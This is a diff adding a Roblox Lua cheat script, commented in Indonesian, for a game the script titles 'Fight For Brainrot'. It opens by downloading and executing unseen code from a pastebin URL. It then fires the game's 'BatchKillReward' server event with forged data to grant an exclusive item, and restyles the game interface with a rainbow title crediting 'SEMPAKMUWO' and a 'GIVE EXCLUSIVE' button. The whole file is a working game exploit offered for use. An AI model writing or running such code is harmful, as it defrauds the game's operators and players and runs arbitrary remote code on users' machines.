@@ -1,0 +1,95 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/7LsZKZGY"))()
+
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local pGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+local hue = 0
+
+-- FUNGSI KERAMAT BIAR ITEM MASUK INVENTORY
+local function GIVE_EXCLUSIVE_ITEM()
+    local args = {
+        {
+            {
+                itemName = "Girafa Celestre",
+                mutation = "Galaxy",
+                rarity = "Exclusive",
+                reward = 3335
+            }
+        },
+        {
+            {
+                Mutation = "Galaxy",
+                Name = "Girafa Celestre",
+                Rarity = "Exclusive"
+            }
+        }
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("_Net"):WaitForChild("BatchKillReward"):FireServer(unpack(args))
+end
+
+local function FinalBrutalFix(v, disco)
+    if v:FindFirstAncestor("Index") then return end
+
+    if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
+        local txt = v.Text:lower()
+        
+        -- 1. HAPUS TOTAL 3 TOMBOL SAMPAH (NAME, MUTATE, RARITY)
+        if txt:find("name") or txt:find("mutate") or txt:find("rarity") then
+            v.Parent.Visible = false
+            v.Visible = false
+            return
+        end
+
+        -- 2. JUDUL RAINBOW DISCO (FIGHT FOR BRAINROT)
+        if v.Text:find("Fight") or v.Text:find("SEMPAKMUWO") or v.Text:find("Troll") or v.Text:find("Ube") then
+            v.Text = "Fight For Brainrot By: SEMPAKMUWO"
+            v.TextScaled = true
+            v.TextColor3 = Color3.new(1, 1, 1)
+            if v.Parent:IsA("GuiObject") then
+                v.Parent.BackgroundColor3 = disco
+                v.Parent.BackgroundTransparency = 0
+            end
+        -- 3. TOMBOL GIVE EXCLUSIVE (DIBUAT WORK!)
+        elseif txt:find("give") then
+            v.Text = "GIVE EXCLUSIVE"
+            v.TextColor3 = Color3.new(1, 1, 1)
+            v.BackgroundColor3 = Color3.new(0, 0, 0)
+            -- Paksa fungsi jalan pas diklik
+            if not v:FindFirstChild("IsBound") then
+                local b = Instance.new("BoolValue", v)
+                b.Name = "IsBound"
+                v.MouseButton1Click:Connect(function()
+                    GIVE_EXCLUSIVE_ITEM()
+                end)
+            end
+        else
+            -- LAINNYA JADI HITAM PEKAT
+            v.TextColor3 = Color3.new(1, 1, 1)
+            if v.Parent:IsA("Frame") and v.Parent.BackgroundTransparency < 1 then
+                v.Parent.BackgroundColor3 = Color3.new(0, 0, 0)
+            end
+        end
+    end
+
+    -- 4. POSISI TOMBOL OPEN (BIAR PAS SEBELAH KIRI AUTO SELL)
+    if v.Name:lower():find("open") or (v:IsA("TextButton") and v.Text:lower():find("open")) then
+        v.Position = UDim2.new(0.35, 0, 0.05, 0) 
+        v.BackgroundColor3 = Color3.new(0, 0, 0)
+        v.BackgroundTransparency = 0
+        v.ZIndex = 10
+    end
+end
+
+RunService.RenderStepped:Connect(function()
+    hue = hue + 0.1
+    if hue > 1 then hue = 0 end
+    local disco = Color3.fromHSV(hue, 1, 1)
+
+    pcall(function()
+        for _, v in pairs(pGui:GetDescendants()) do
+            if v:IsA("GuiObject") then
+                FinalBrutalFix(v, disco)
+            end
+        end
+    end)
+end)
